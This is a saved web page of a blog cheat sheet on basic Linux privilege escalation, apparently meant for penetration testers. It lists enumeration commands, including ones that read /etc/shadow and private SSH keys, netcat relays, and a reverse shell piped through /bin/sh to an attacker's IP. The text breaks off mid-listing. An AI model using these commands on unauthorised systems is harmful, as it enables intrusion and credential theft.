<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!-->
<html class="js video no-maskImage placeholder" lang="en"><!--<![endif]--><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Basic Linux Privilege Escalation</title><meta name="author" content="g0tmi1k"><meta name="description" content="Before starting, I would like to point out - I'm no expert. As far as I know, there isn't a " magic"="" answer,="" in="" this="" huge="" area.="" is="" simply="" my…"=""><meta name="keywords" content="bypassing,commands,privilege escalation"><meta name="HandheldFriendly" content="True"><meta name="MobileOptimized" content="320"><meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1"><script async="" data-rocketsrc="//www.google-analytics.com/analytics.js" data-rocketoptimized="true"></script><script async="" src="Basic%20Linux%20Privilege%20Escalation_files/analytics.js"></script><script src="Basic%20Linux%20Privilege%20Escalation_files/y10m8avP2xOxyRIT2QFAfo7rEUY.js"></script><script type="text/javascript">
//<![CDATA[
window.__cfRocketOptions = {byc:0,p:0,petok:"6eb9e36b33f67b0c5006fdbe64fb22ed9d725ffc-1509231214-3600"};
//]]>
</script>
<script type="text/javascript" src="Basic%20Linux%20Privilege%20Escalation_files/rocket.js"></script>
<link rel="canonical" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"><link rel="sitemap" type="application/xml" href="https://blog.g0tmi1k.com/sitemap.xml"><link rel="author" type="text/plain" href="https://blog.g0tmi1k.com/robots.txt"><link rel="author" type="text/plain" href="https://blog.g0tmi1k.com/humans.txt"><link href="https://plus.google.com/+gottmilk" rel="publisher"><meta name="application-name" content="g0tmi1k"><link href="https://blog.g0tmi1k.com/favicon.ico" type="image/x-icon" rel="icon"><link href="Basic%20Linux%20Privilege%20Escalation_files/screen.css" media="screen, projection" rel="stylesheet" type="text/css"><link href="https://blog.g0tmi1k.com/atom.xml" rel="alternate" title="g0tmi1k" type="application/atom+xml"><link rel="apple-touch-icon" href="https://blog.g0tmi1k.com/apple-touch-icon.png"><link rel="apple-touch-icon" sizes="57x57" href="https://blog.g0tmi1k.com/apple-touch-icon-57x57.png"><link rel="apple-touch-icon" sizes="72x72" href="https://blog.g0tmi1k.com/apple-touch-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="https://blog.g0tmi1k.com/apple-touch-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="https://blog.g0tmi1k.com/apple-touch-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="https://blog.g0tmi1k.com/apple-touch-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="https://blog.g0tmi1k.com/apple-touch-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="https://blog.g0tmi1k.com/apple-touch-icon-152x152.png"><link href="Basic%20Linux%20Privilege%20Escalation_files/css.css" rel="stylesheet" type="text/css"><link href="Basic%20Linux%20Privilege%20Escalation_files/css_002.css" rel="stylesheet" type="text/css"></head> <body><noscript><h4>This site works better with a little bit of Javascript</h4></noscript> <header role="banner"></header> <nav role="navigation"><ul class="subscription" data-subscription="rss"><li><a href="https://blog.g0tmi1k.com/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li></ul><form action="https://www.google.com/search" method="GET"><fieldset role="search"> <input name="sitesearch" value="blog.g0tmi1k.com" type="hidden"> <input name="q" class="search" placeholder="Search"></fieldset></form><fieldset class="mobile-nav"><select><option value="" selected="selected">Navigate…</option><option value="https://blog.g0tmi1k.com/">» Blog</option><option value="https://blog.g0tmi1k.com/archives/">» Archives</option><option value="https://blog.g0tmi1k.com/categories/scripts/">» Scripts</option><option value="https://blog.g0tmi1k.com/categories/video/">» Videos</option><option value="https://blog.g0tmi1k.com/atom.xml">» RSS</option></select></fieldset><ul class="main-navigation"><li><a href="https://blog.g0tmi1k.com/">Blog</a></li><li><a href="https://blog.g0tmi1k.com/archives/">Archives</a></li><li><a href="https://blog.g0tmi1k.com/categories/scripts/">Scripts</a></li><li><a href="https://blog.g0tmi1k.com/categories/video/">Videos</a></li></ul></nav><div id="main"><div id="content"><div> <article itemscope="" itemtype="http://schema.org/BlogPosting" class="hentry" role="article"> <header><h1 class="entry-title">Basic Linux Privilege Escalation</h1><p class="meta"></p> </header><div class="entry-content"><p>Before starting, I would like to point out - <strong>I'm no expert</strong>. As far as I know, there isn't a "magic" answer, in this huge area. This is simply my finding, typed up, to be shared <em>(my <a href="http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html">starting point</a>)</em>.
 Below is a mixture of commands to do the same thing, to look at things 
in a different place or just a different light. I know there more 
"things" to look for. It's just a <strong>basic &amp; rough guide</strong>.
 Not every command will work for each system as Linux varies so much. 
"It" will not jump off the screen - you've to hunt for that <em>"little thing"</em> as "<em>the devil is in the detail</em>".</p><a name="Enumeration.is.the.key."></a><h4>Enumeration is the key.</h4><p>(Linux) privilege escalation is all about:</p><ul><li>Collect - <em><strong>Enumeration</strong>, more enumeration and some more enumeration.</em></li><li>Process - <em>Sort through data, <strong>analyse</strong> and prioritisation.</em></li><li>Search - <em>Know what to search for and where to <strong>find </strong>the exploit code.</em></li><li>Adapt - <em><strong>Customize</strong> the exploit, so it fits. Not every exploit work for every system "out of the box".</em></li><li>Try - <em>Get ready for (lots of) <strong>trial and error</strong>.</em></li></ul><a name="Operating.System"></a><h2>Operating System</h2><a name="What.s.the.distribution.type...em.What.version...em."></a><h4>What's the distribution type? <em>What version?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat /etc/issue
</span><span class="line">cat /etc/*-release
</span><span class="line">  cat /etc/lsb-release      <span class="c"># Debian based</span>
</span><span class="line">  cat /etc/redhat-release   <span class="c"># Redhat based</span>
</span></code></pre></td></tr></tbody></table></div></figure><a name="What.s.the.kernel.version...em.Is.it.64-bit...em."></a><h4>What's the kernel version? <em>Is it 64-bit?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat /proc/version
</span><span class="line">uname -a
</span><span class="line">uname -mrs
</span><span class="line">rpm -q kernel
</span><span class="line">dmesg <span class="p">|</span> grep Linux
</span><span class="line">ls /boot <span class="p">|</span> grep vmlinuz-
</span></code></pre></td></tr></tbody></table></div></figure><a name="What.can.be.learnt.from.the.environmental.variables."></a><h4>What can be learnt from the environmental variables?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat /etc/profile
</span><span class="line">cat /etc/bashrc
</span><span class="line">cat ~/.bash_profile
</span><span class="line">cat ~/.bashrc
</span><span class="line">cat ~/.bash_logout
</span><span class="line">env
</span><span class="line"><span class="nb">set</span>
</span></code></pre></td></tr></tbody></table></div></figure><a name="Is.there.a.printer."></a><h4>Is there a printer?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span></pre></td><td class="code"><pre><code class="bash"><span class="line">lpstat -a
</span></code></pre></td></tr></tbody></table></div></figure><a name="Applications..amp..Services"></a><h2>Applications &amp; Services</h2><a name="What.services.are.running...em.Which.service.has.which.user.privilege...em."></a><h4>What services are running? <em>Which service has which user privilege?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span></pre></td><td class="code"><pre><code class="bash"><span class="line">ps aux
</span><span class="line">ps -ef
</span><span class="line">top
</span><span class="line">cat /etc/services
</span></code></pre></td></tr></tbody></table></div></figure><a name="Which.service.s..are.been.running.by..em.root..Of.these.services..which.are.vulnerable.-.it.s.worth.a.double.check...em."></a><h4>Which service(s) are been running by <em>root? Of these services, which are vulnerable - it's worth a double check!</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span></pre></td><td class="code"><pre><code class="bash"><span class="line">ps aux <span class="p">|</span> grep root
</span><span class="line">ps -ef <span class="p">|</span> grep root
</span></code></pre></td></tr></tbody></table></div></figure><a name="What.applications.are.installed...em.What.version.are.they..Are.they.currently.running...em."></a><h4>What applications are installed? <em>What version are they? Are they currently running?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span></pre></td><td class="code"><pre><code class="bash"><span class="line">ls -alh /usr/bin/
</span><span class="line">ls -alh /sbin/
</span><span class="line">dpkg -l
</span><span class="line">rpm -qa
</span><span class="line">ls -alh /var/cache/apt/archivesO
</span><span class="line">ls -alh /var/cache/yum/
</span></code></pre></td></tr></tbody></table></div></figure><a name="Any.of.the.service.s..settings.misconfigured...em.Are.any..vulnerable..plugins.attached...em."></a><h4>Any of the service(s) settings misconfigured? <em>Are any (vulnerable) plugins attached?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat /etc/syslog.conf
</span><span class="line">cat /etc/chttp.conf
</span><span class="line">cat /etc/lighttpd.conf
</span><span class="line">cat /etc/cups/cupsd.conf
</span><span class="line">cat /etc/inetd.conf
</span><span class="line">cat /etc/apache2/apache2.conf
</span><span class="line">cat /etc/my.conf
</span><span class="line">cat /etc/httpd/conf/httpd.conf
</span><span class="line">cat /opt/lampp/etc/httpd.conf
</span><span class="line">ls -aRl /etc/ <span class="p">|</span> awk <span class="err">'</span><span class="nv">$1</span> ~ /^.*r.*/
</span></code></pre></td></tr></tbody></table></div></figure><a name="What.jobs.are.scheduled."></a><h4>What jobs are scheduled?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span></pre></td><td class="code"><pre><code class="bash"><span class="line">crontab -l
</span><span class="line">ls -alh /var/spool/cron
</span><span class="line">ls -al /etc/ <span class="p">|</span> grep cron
</span><span class="line">ls -al /etc/cron*
</span><span class="line">cat /etc/cron*
</span><span class="line">cat /etc/at.allow
</span><span class="line">cat /etc/at.deny
</span><span class="line">cat /etc/cron.allow
</span><span class="line">cat /etc/cron.deny
</span><span class="line">cat /etc/crontab
</span><span class="line">cat /etc/anacrontab
</span><span class="line">cat /var/spool/cron/crontabs/root
</span></code></pre></td></tr></tbody></table></div></figure><a name="Any.plain.text.usernames.and.or.passwords."></a><h4>Any plain text usernames and/or passwords?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span></pre></td><td class="code"><pre><code class="bash"><span class="line">grep -i user <span class="o">[</span>filename<span class="o">]</span>
</span><span class="line">grep -i pass <span class="o">[</span>filename<span class="o">]</span>
</span><span class="line">grep -C <span class="m">5</span> <span class="s2">"password"</span> <span class="o">[</span>filename<span class="o">]</span>
</span><span class="line">find . -name <span class="s2">"*.php"</span> -print0 <span class="p">|</span> xargs -0 grep -i -n <span class="s2">"var $password"</span>   <span class="c"># Joomla</span>
</span></code></pre></td></tr></tbody></table></div></figure><a name="Communications..amp..Networking"></a><h2>Communications &amp; Networking</h2><a name="What.NIC.s..does.the.system.have...em.Is.it.connected.to.another.network...em."></a><h4>What NIC(s) does the system have? <em>Is it connected to another network?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span></pre></td><td class="code"><pre><code class="bash"><span class="line">/sbin/ifconfig -a
</span><span class="line">cat /etc/network/interfaces
</span><span class="line">cat /etc/sysconfig/network
</span></code></pre></td></tr></tbody></table></div></figure><a name="What.are.the.network.configuration.settings...em.What.can.you.find.out.about.this.network..DHCP.server..DNS.server..Gateway...em."></a><h4>What are the network configuration settings? <em>What can you find out about this network? DHCP server? DNS server? Gateway?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat /etc/resolv.conf
</span><span class="line">cat /etc/sysconfig/network
</span><span class="line">cat /etc/networks
</span><span class="line">iptables -L
</span><span class="line">hostname
</span><span class="line">dnsdomainname
</span></code></pre></td></tr></tbody></table></div></figure><a name="What.other.users..amp..hosts.are.communicating.with.the.system."></a><h4>What other users &amp; hosts are communicating with the system?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span></pre></td><td class="code"><pre><code class="bash"><span class="line">lsof -i
</span><span class="line">lsof -i :80
</span><span class="line">grep <span class="m">80</span> /etc/services
</span><span class="line">netstat -antup
</span><span class="line">netstat -antpx
</span><span class="line">netstat -tulpn
</span><span class="line">chkconfig --list
</span><span class="line">chkconfig --list <span class="p">|</span> grep 3:on
</span><span class="line">last
</span><span class="line">w
</span></code></pre></td></tr></tbody></table></div></figure><a name="Whats.cached...em.IP.and.or.MAC.addresses..em."></a><h4>Whats cached? <em>IP and/or MAC addresses</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span></pre></td><td class="code"><pre><code class="bash"><span class="line">arp -e
</span><span class="line">route
</span><span class="line">/sbin/route -nee
</span></code></pre></td></tr></tbody></table></div></figure><a name="Is.packet.sniffing.possible..What.can.be.seen...em.Listen.to.live.traffic..em."></a><h4>Is packet sniffing possible? What can be seen? <em>Listen to live traffic</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span></pre></td><td class="code"><pre><code class="bash"><span class="line">tcpdump tcp dst 192.168.1.7 <span class="m">80</span> and tcp dst 10.5.5.252 21
</span></code></pre></td></tr></tbody></table></div></figure><p><em>Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]</em></p><a name="Have.you.got.a.shell...em.Can.you.interact.with.the.system...em."></a><h4>Have you got a shell? <em>Can you interact with the system?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span></pre></td><td class="code"><pre><code class="bash"><span class="line">nc -lvp <span class="m">4444</span>    <span class="c"># Attacker. Input (Commands)</span>
</span><span class="line">nc -lvp <span class="m">4445</span>    <span class="c"># Attacker. Ouput (Results)</span>
</span><span class="line">telnet <span class="o">[</span>atackers ip<span class="o">]</span> <span class="m">44444</span> <span class="p">|</span> /bin/sh <span class="p">|</span> <span class="o">[</span><span class="nb">local </span>ip<span class="o">]</span> <span class="m">44445</span>    <span class="c"># On the targets system. Use the attackers IP!</span>
</span></code></pre></td></tr></tbody></table></div></figure><p><em>Note: <a href="http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/">http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a></em></p><a name="Is.port.forwarding.possible...em.Redirect.and.interact.with.traffic.from.another.view..em."></a><h4>Is port forwarding possible? <em>Redirect and interact with traffic from another view</em></h4><p><em>Note: <a href="http://www.boutell.com/rinetd/">http://www.boutell.com/rinetd/</a></em></p><p><em>Note: <a href="http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch">http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch</a></em></p><p><em>Note: <a href="http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip">http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip</a></em></p><p><em>Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]</em></p><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span></pre></td><td class="code"><pre><code class="bash"><span class="line">FPipe.exe -l <span class="m">80</span> -r <span class="m">80</span> -s <span class="m">80</span> 192.168.1.7
</span></code></pre></td></tr></tbody></table></div></figure><p><em>Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]</em></p><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span></pre></td><td class="code"><pre><code class="bash"><span class="line">ssh -L 8080:127.0.0.1:80 root@192.168.1.7    <span class="c"># Local Port</span>
</span><span class="line">ssh -R 8080:127.0.0.1:80 root@192.168.1.7    <span class="c"># Remote Port</span>
</span></code></pre></td></tr></tbody></table></div></figure><p><em>Note: mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe</em></p><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span></pre></td><td class="code"><pre><code class="bash"><span class="line">mknod backpipe p <span class="p">;</span> nc -l -p <span class="m">8080</span> &lt; backpipe <span class="p">|</span> nc 10.5.5.151 <span class="m">80</span> &gt;backpipe    <span class="c"># Port Relay</span>
</span><span class="line">mknod backpipe p <span class="p">;</span> nc -l -p <span class="m">8080</span> <span class="m">0</span> <span class="p">&amp;</span> &lt; backpipe <span class="p">|</span> tee -a inflow <span class="p">|</span> nc localhost <span class="m">80</span> <span class="p">|</span> tee -a outflow 1&gt;backpipe    <span class="c"># Proxy (Port 80 to 8080)</span>
</span><span class="line">mknod backpipe p <span class="p">;</span> nc -l -p <span class="m">8080</span> <span class="m">0</span> <span class="p">&amp;</span> &lt; backpipe <span class="p">|</span> tee -a inflow <span class="p">|</span> nc localhost <span class="m">80</span> <span class="p">|</span> tee -a outflow <span class="p">&amp;</span> 1&gt;backpipe    <span class="c"># Proxy monitor (Port 80 to 8080)</span>
</span></code></pre></td></tr></tbody></table></div></figure><a name="Is.tunnelling.possible...em.Send.commands.locally..remotely..em."></a><h4>Is tunnelling possible? <em>Send commands locally, remotely</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span></pre></td><td class="code"><pre><code class="bash"><span class="line">ssh -D 127.0.0.1:9050 -N <span class="o">[</span>username<span class="o">]</span>@<span class="o">[</span>ip<span class="o">]</span>
</span><span class="line">proxychains ifconfig
</span></code></pre></td></tr></tbody></table></div></figure><a name="Confidential.Information..amp..Users"></a><h2>Confidential Information &amp; Users</h2><a name="Who.are.you..Who.is.logged.in..Who.has.been.logged.in..Who.else.is.there..Who.can.do.what."></a><h4>Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span></pre></td><td class="code"><pre><code class="bash"><span class="line">id
</span><span class="line">who
</span><span class="line">w
</span><span class="line">last
</span><span class="line">cat /etc/passwd <span class="p">|</span> cut -d: -f1    <span class="c"># List of users</span>
</span><span class="line">grep -v -E <span class="s2">"^#"</span> /etc/passwd <span class="p">|</span> awk -F: <span class="s1">'$3 == 0 { print $1}'</span>   <span class="c"># List of super users</span>
</span><span class="line">awk -F: <span class="s1">'($3 == "0") {print}'</span> /etc/passwd   <span class="c"># List of super users</span>
</span><span class="line">cat /etc/sudoers
</span><span class="line">sudo -l
</span></code></pre></td></tr></tbody></table></div></figure><a name="What.sensitive.files.can.be.found."></a><h4>What sensitive files can be found?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat /etc/passwd
</span><span class="line">cat /etc/group
</span><span class="line">cat /etc/shadow
</span><span class="line">ls -alh /var/mail/
</span></code></pre></td></tr></tbody></table></div></figure><a name="Anything..interesting..in.the.home.directorie.s....em.If.it.s.possible.to.access..em."></a><h4>Anything "interesting" in the home directorie(s)? <em>If it's possible to access</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span></pre></td><td class="code"><pre><code class="bash"><span class="line">ls -ahlR /root/
</span><span class="line">ls -ahlR /home/
</span></code></pre></td></tr></tbody></table></div></figure><a name="Are.there.any.passwords.in..scripts..databases..configuration.files.or.log.files...em.Default.paths.and.locations.for.passwords..em."></a><h4>Are there any passwords in; scripts, databases, configuration files or log files? <em>Default paths and locations for passwords</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat /var/apache2/config.inc
</span><span class="line">cat /var/lib/mysql/mysql/user.MYD
</span><span class="line">cat /root/anaconda-ks.cfg
</span></code></pre></td></tr></tbody></table></div></figure><a name="What.has.the.user.being.doing...em.Is.there.any.password.in.plain.text..What.have.they.been.edting...em."></a><h4>What has the user being doing? <em>Is there any password in plain text? What have they been edting?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat ~/.bash_history
</span><span class="line">cat ~/.nano_history
</span><span class="line">cat ~/.atftp_history
</span><span class="line">cat ~/.mysql_history
</span><span class="line">cat ~/.php_history
</span></code></pre></td></tr></tbody></table></div></figure><a name="What.user.information.can.be.found."></a><h4>What user information can be found?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat ~/.bashrc
</span><span class="line">cat ~/.profile
</span><span class="line">cat /var/mail/root
</span><span class="line">cat /var/spool/mail/root
</span></code></pre></td></tr></tbody></table></div></figure><a name="Can.private-key.information.be.found."></a><h4>Can private-key information be found?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span></pre></td><td class="code"><pre><code class="bash"><span class="line">cat ~/.ssh/authorized_keys
</span><span class="line">cat ~/.ssh/identity.pub
</span><span class="line">cat ~/.ssh/identity
</span><span class="line">cat ~/.ssh/id_rsa.pub
</span><span class="line">cat ~/.ssh/id_rsa
</span><span class="line">cat ~/.ssh/id_dsa.pub
</span><span class="line">cat ~/.ssh/id_dsa
</span><span class="line">cat /etc/ssh/ssh_config
</span><span class="line">cat /etc/ssh/sshd_config
</span><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub
</span><span class="line">cat /etc/ssh/ssh_host_dsa_key
</span><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub
</span><span class="line">cat /etc/ssh/ssh_host_rsa_key
</span><span class="line">cat /etc/ssh/ssh_host_key.pub
</span><span class="line">cat /etc/ssh/ssh_host_key
</span></code></pre></td></tr></tbody></table></div></figure><a name="File.Systems"></a><h2>File Systems</h2><a name="Which.configuration.files.can.be.written.in..etc....em.Able.to.reconfigure.a.service...em."></a><h4>Which configuration files can be written in /etc/? <em>Able to reconfigure a service?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span></pre></td><td class="code"><pre><code class="bash"><span class="line">ls -aRl /etc/ <span class="p">|</span> awk <span class="s1">'$1 ~ /^.*w.*/'</span> 2&gt;/dev/null     <span class="c"># Anyone</span>
</span><span class="line">ls -aRl /etc/ <span class="p">|</span> awk <span class="s1">'$1 ~ /^..w/'</span> 2&gt;/dev/null       <span class="c"># Owner</span>
</span><span class="line">ls -aRl /etc/ <span class="p">|</span> awk <span class="s1">'$1 ~ /^.....w/'</span> 2&gt;/dev/null    <span class="c"># Group</span>
</span><span class="line">ls -aRl /etc/ <span class="p">|</span> awk <span class="s1">'$1 ~ /w.$/'</span> 2&gt;/dev/null        <span class="c"># Other</span>
</span><span class="line">
</span><span class="line">find /etc/ -readable -type f 2&gt;/dev/null               <span class="c"># Anyone</span>
</span><span class="line">find /etc/ -readable -type f -maxdepth <span class="m">1</span> 2&gt;/dev/null   <span class="c"># Anyone</span>
</span></code></pre></td></tr></tbody></table></div></figure><a name="What.can.be.found.in..var..."></a><h4>What can be found in /var/ ?</h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span></pre></td><td class="code"><pre><code class="bash"><span class="line">ls -alh /var/log
</span><span class="line">ls -alh /var/mail
</span><span class="line">ls -alh /var/spool
</span><span class="line">ls -alh /var/spool/lpd
</span><span class="line">ls -alh /var/lib/pgsql
</span><span class="line">ls -alh /var/lib/mysql
</span><span class="line">cat /var/lib/dhcp3/dhclient.leases
</span></code></pre></td></tr></tbody></table></div></figure><a name="Any.settings.files..hidden..on.website...em.Any.settings.file.with.database.information...em."></a><h4>Any settings/files (hidden) on website? <em>Any settings file with database information?</em></h4><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span></pre></td><td class="code"><pre><code class="bash"><span class="line">ls -alhR /var/www/
</span><span class="line">ls -alhR /srv/www/htdocs/
</span><span class="line">ls -alhR /usr/local/www/apache22/data/
</span><span class="line">ls -alhR /opt/lampp/htdocs/
</span><span class="line">ls -alhR /var/www/html/
</span></code></pre></td></tr></tbody></table></div></figure><p>Is there anything in the log file(s) <em>(Could help with "Local File Includes"!)</em></p><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
